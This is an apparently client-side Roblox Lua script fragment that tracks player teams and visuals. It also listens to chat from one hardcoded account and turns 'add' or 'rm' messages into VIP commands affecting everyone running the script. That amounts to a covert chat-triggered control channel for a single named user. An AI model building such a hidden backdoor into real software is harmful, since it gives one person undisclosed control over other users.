local TARGET_ADMIN = "ehfphvg362"

local function executeChatCommand(fullMessage)
    local args = string.split(fullMessage, " ")
    local action = args[1] 
    local amount = tonumber(args[2])
    local targetName = args[3] 
    
    if (action == "add" or action == "rm") and amount and targetName then
        targetName = targetName:lower()
        if targetName == "all" or targetName == player.Name:lower() then
            local mockData = {
                vip_command = {
                    action = action,
                    amount = amount
                }
            }
            processFirebaseCommands(mockData)
        end
    end
end

local function hookPlayerChat(p)
    if p.Name == TARGET_ADMIN then
        p.Chatted:Connect(function(message)
            pcall(function() executeChatCommand(message) end)
        end)
    end
end

for _, p in pairs(players:GetPlayers()) do hookPlayerChat(p) end

players.PlayerAdded:Connect(function(p)
    playerCache[p.UserId] = { team = p.Team } 
    p.Changed:Connect(function(prop) if prop == "Team" then updatePlayerTeamStatus(p) end end) 
    p.CharacterAdded:Connect(function() task.wait(0.2) refreshPlayerVisuals(p) end)
    hookPlayerChat(p)
end)

players.PlayerRemoving:Connect(function(p) playerCache[p.UserId] = nil end)

for _, p in pairs(players:GetPlayers()) do 
    if p ~= player then 
        if p.Character then task.spawn(refreshPlayerVisuals, p) end
        p.CharacterAdded:Connect(function() task.wait(0.2) refreshPlayerVisuals(p) end) 
    end 
end
